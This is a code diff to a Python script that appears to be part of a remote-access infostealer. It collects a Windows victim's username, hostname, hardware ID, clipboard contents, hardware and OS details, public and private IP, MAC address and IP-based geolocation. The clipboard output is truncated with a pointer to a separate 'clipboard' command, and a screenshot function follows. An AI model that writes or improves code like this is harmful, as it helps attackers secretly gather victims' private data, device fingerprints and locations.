@@ -18,7 +18,6 @@ def user():
 
     return f"\nDisplay Name: {display_name} \nHostname: {hostname} \nUsername: {username}"
         
-
 def system():
     try:
         hwid = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
@@ -26,16 +25,30 @@ def system():
         hwid = "Unknown"
     
     try:
-        clipboard = pyperclip.paste()
+        clipboard = f"``````{pyperclip.paste()}``````"
     except:
         clipboard = "Unknown"
     
+    if clipboard == "":
+        clipboard = "null"
+    elif len(clipboard) > 1500:
+        clipboard = "Clipboard is too long, use 'clipboard' command to get full clipboard!" 
+    
+    def get_os():
+        try:
+            wmi_obj = wmi.WMI()
+            os_info = wmi_obj.Win32_OperatingSystem()[0]
+            return os_info.Caption
+        except:
+            return "Unknown"
+    
+    os = get_os()
     cpu = wmi.WMI().Win32_Processor()[0].Name
     gpu = wmi.WMI().Win32_VideoController()[0].Name
     ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize
     ram = round(float(ram) / 1048576)
     
-    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}"
+    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}\nOS: {os}\n"
 
 
 def disk():
@@ -60,12 +73,13 @@ def network():
     try:
         public_ip = requests.get("https://api.ipify.org").text
     except:
-        pass
+        public_ip = "Unknown"
     private_ip = socket.gethostbyname(socket.getfqdn())
     mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-    country, region, city, zip_code, isp = location(public_ip)
-    
-    return f"\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
+    country, region, city, zip_code, isp = location(public_ip) #if public_ip != "Unknown":  country, region, city, zip_code, isp = location(public_ip)
+    try:
+        return f"\nPublic IP: {public_ip}\nLocal IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
+    except: return "Unknown"
 
 def screenshot():
     try:
